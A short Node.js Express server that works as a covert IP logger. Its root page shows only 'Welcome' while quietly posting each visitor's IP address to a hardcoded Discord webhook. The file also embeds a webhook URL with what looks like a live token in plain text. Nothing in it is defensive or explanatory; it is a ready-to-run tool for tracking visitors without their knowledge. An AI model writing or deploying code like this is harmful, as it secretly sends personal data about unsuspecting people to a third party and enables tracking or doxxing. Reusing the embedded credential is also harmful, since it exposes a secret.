const express = require("express");
const axios = require("axios");

const app = express();

const WEBHOOK_URL = "https://discord.com/api/webhooks/1519163425148637336/gwmx1gVTyfQnpSaWUS6EWPM0WqrOo8VHv3Vd7nGyV2lZp6vH4Vnv0VIQFLEoYjE54pek";

app.get("/", async (req, res) => {

    const ip =
        req.headers["x-forwarded-for"] ||
        req.socket.remoteAddress;

    await axios.post(WEBHOOK_URL, {
        content: `New visitor IP: ${ip}`
    });

    res.send("Welcome");
});

app.listen(3000, () => {
    console.log("Server running");
});